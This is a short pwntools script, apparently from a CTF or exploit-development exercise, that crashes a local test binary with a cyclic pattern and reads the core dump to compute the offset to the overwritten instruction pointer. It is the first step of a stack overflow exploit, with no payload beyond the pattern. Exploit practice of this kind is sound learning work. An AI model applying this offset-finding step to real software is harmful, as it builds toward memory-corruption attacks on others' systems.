from pwn import *

context.arch = 'amd64'
p = process('./test_demon2')
payload = cyclic(76)
p.sendline(payload)
p.wait()

core = p.corefile
rip_value = core.rip

# Ручной поиск оффсета
offset = cyclic_find(rip_value & 0xffffffff)
log.info(f"Calculated Offset: {offset}")
